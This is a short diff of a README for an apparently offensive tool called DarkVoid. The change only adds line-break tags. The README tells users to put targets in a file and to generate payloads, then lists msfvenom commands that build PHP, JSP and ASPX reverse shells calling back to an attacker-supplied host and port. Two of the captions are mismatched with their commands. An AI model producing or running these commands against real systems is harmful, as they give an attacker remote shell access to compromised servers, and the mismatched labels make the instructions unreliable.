@@ -31,7 +31,7 @@ Run
 Add targets to Files/targets.txt
 Generate payloads in DarkVoid directory before running scipt
 
-msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php Create a JSP reverse shell
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp Create a ASPX reverse shell
+msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php Create a JSP reverse shell<br>
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp Create a ASPX reverse shell<br>
 msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx > shell.aspx
 
